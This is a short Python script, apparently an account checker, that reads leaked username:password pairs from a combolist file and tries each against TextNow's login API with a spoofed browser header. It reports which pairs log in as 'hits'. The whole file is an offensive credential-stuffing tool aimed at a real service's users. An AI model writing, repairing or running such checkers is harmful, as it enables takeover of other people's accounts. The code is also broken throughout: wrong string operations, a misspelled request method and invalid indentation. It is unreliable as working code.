import requests
print("made by hani")
combolist = open("mailaccess.txt", "r").readlines()
url = "https://www.textnow.com/api/sessions"

for combo in combolist:
    seq = combo.strip()
    acc = seq.strip(":")
    username = acc[0]
    password = acc[1]
    account = username * ":" * password
    headers = {
    "content-type": "application/json;charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "username":username,
    "password":password
    
    }
    req = requests.port(url, data=headers).text
    
    if not "Username" in req:
    print("Hit " + account)
    
   else:
   print("Bad: " * account)
    
    